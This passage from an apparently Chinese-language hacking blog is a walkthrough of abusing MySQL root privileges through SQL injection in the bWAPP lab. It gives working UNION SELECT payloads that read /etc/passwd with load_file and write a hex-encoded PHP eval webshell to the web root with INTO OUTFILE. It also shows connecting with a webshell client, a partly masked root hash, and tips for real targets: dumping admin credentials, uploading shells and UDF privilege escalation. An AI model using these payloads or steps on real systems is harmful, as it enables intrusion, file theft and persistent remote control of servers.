<p>8,最终,得到的root的密码hash如下,如果是实际测试,你还可以顺手telnet下目标的3306,假设目标的mysql能外联,直接用nvaicat连上去操作也许会更方便点<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root : *<span class="number">13</span>A03393631C03176D03A9F5C13CB*******</span><br></pre></td></tr></table></figure></p>
<p><br><br><br></p>
<p>9,这里root权限下的读写操作,就以bwapp中的注入练习为例进行说明了,首先,我们尝试读取目标系统中的/etc/passwd文件,下面的十六进制数据是/etc/passwd hex后的内容<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,load_file(<span class="number">0x2f6574632f706173737764</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root9.png" alt="&#39;&#39;"><br><br></p>
<p>10,依然是上面的注入点,这次我们尝试向目标的网站目录中写入php一句话,下面的十六进制数据的明文是&lt;?php @eval($_POST[‘klion’]);?&gt;,后面则是目标网站的物理路径,意思就是把这个一句话写到这个目录中,如下可以看到,提示不能写,原因很明显,因为以你当前的用户身份对这个目录是没有写权限的,如果想写进去,就只能自己动手去把权限放宽一些,因为这里是在本地测试,权限不够,自己给一下就可以了,但实际测试中,如果没权限,那你就只能看看读,如果读也不能读,mysql的root密码hash总也能查出来吧,再或者如果真的是权限被降的一塌糊涂,网站的管理表总归是可以查的吧,按正常的注入把管理员的账号查出来再登到后台传shell也是可以的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root10.png" alt="&#39;&#39;"><br><br></p>
<p>可以看到,当我们放开权限之后,shell被正常写进去了,虽然报了点警告,但无伤大雅<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root11.png" alt="&#39;&#39;"><br><br></p>
<p>细心的表哥们可能会看到,这里的一句话掉了个分号,其实,在php中最后一行代码不加分号是可行的<br><img src="/img/mysql_root12.png" alt="&#39;&#39;"></p>
<p>执行似乎没什么问题,现在尝试用菜刀连一下,脚本正常执行,shell正常连接<br><img src="/img/mysql_root13.png" alt="&#39;&#39;"><br><img src="/img/mysql_root14.png" alt="&#39;&#39;"><br><br></p>
<p>关于mysql root权限下的权限利用需要注意的一些点:<br><code>(1),正常情况下mysql的root用户确实可以在数据库中为所欲为,但这并不意味着你在目标操作系统中也可以为所欲为,如果启动mysql服务的用户身份只是系统的一个普通用户,那么你在系统中的权限撑死了也就只是个普通用户权限,因为你继承的是那个启动mysql服务的用户权限,说这些只是为了让大家对于mysql root权限下的文件读写利用有个更清晰的认识,大多数时候你会发现,即使你确实是mysql的root用户,但依然没法正常的读写文件,原因就是我上面说的这些,因为你的mysql服务用户只是个普通用户权限,而这个用户对你要操作的那个目录或文件没有读写权限,自然就读写不了,当然,这是基于系统的文件系统权限而言</code><br><code>(2),另外,还有一种情况,假设你对目标的网站目录有正常的读写权限,但是目标在安装完mysql以后对root用户进行了一些权限优化,比如,我想让root只能正常的增删改查,之外的权限全删掉,这时候,你再想进行文件读写,也可能是不行的,因为file权限很可能被干掉了</code><br><code>(3),最后,还可能会有一些别的情况,比如,网站目录被waf或其他的一些防护工具所监控,当你写webshell时,直接就被杀掉或者报警拦截之类的</code><br><code>(4),退一万步来讲,即使你真的没办法读写文件,但这并不妨碍你正常查询数据,拿到网站管理员的账号密码,登到后台传shell也是可以的,不用一条路走到黑,多变通</code><br><code>(5),其实,有时候也可以利用root用户执行系统命令,即udf,有一种提权方法,叫udf提权,利用的就是此特性,还是那句话,即使能执行系统命令,但这并不意味一定可以达到提权(对于linux来讲是直接提到root权限)的效果,关于udf的东西,我们后续再单独说,这里就暂时先放过</code><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,就mysql本身的文件读写来讲,非常简单,只是背后的权限映射,需要大家稍微理解下,个人觉得挺好理解的,又没什么拐弯抹角的,都是死东西,相信你只要以前好好琢磨过操作系统的用户组权限,这个对你来说,基本是一点就通,在操作系统中,所有的程序,都是工作在某种安全上下文中的,而这个安全上下文大多数都是由用户来控制和决定的,好吧,稍不留神又TM跑题了,汗……<br><br></p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/12/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/14/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2017/12/26/modify-hacked/">用shell对指定站点进行简单的实时入侵预警</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/privilege/">privilege</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/NetRipper/">NetRipper</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>